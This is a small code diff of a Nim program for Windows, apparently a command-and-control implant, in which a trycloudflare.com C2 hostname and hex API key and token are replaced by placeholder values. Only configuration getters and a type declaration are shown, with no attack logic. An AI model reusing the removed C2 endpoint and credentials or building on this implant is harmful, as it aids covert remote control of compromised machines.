@@ -5,9 +5,9 @@ import winim/lean
 import std/[strutils, random, os]
 
 # Plaintext - no XOR
-proc getC2Host(): string = "geometry-offered-guns-replies.trycloudflare.com"
-proc getApiKey(): string = "051dfe1cf5e570846315512a11396f7d"
-proc getToken(): string = "8ca60eebbe9a141869305ed9ab1a0050"
+proc getC2Host(): string = "CHANGE-ME.trycloudflare.com"
+proc getApiKey(): string = "00000000000000000000000000000000"
+proc getToken(): string = "00000000000000000000000000000000"
 
 type
   HINTERNET = pointer
